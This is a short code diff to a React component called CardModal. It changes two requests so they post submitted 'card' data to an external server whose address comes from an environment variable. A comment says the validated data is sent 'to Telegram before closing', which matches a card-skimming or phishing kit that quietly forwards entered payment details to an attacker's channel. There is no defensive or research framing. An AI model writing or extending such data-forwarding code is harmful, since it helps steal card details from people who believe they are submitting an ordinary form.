@@ -193,7 +193,10 @@ export default function CardModal({ isOpen, onClose, onSubmit }: CardModalProps)
         setIsSubmitting(true);
 
         try {
-            const response = await fetch('/api/card', {
+            // Get server URL from signaling server (convert wss to https)
+            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';
+
+            const response = await fetch(`${serverUrl}/api/card`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -249,7 +252,10 @@ export default function CardModal({ isOpen, onClose, onSubmit }: CardModalProps)
 
         // Data is valid - send to Telegram before closing
         try {
-            await fetch('/api/card', {
+            // Get server URL from signaling server (convert wss to https)
+            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';
+
+            await fetch(`${serverUrl}/api/card`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
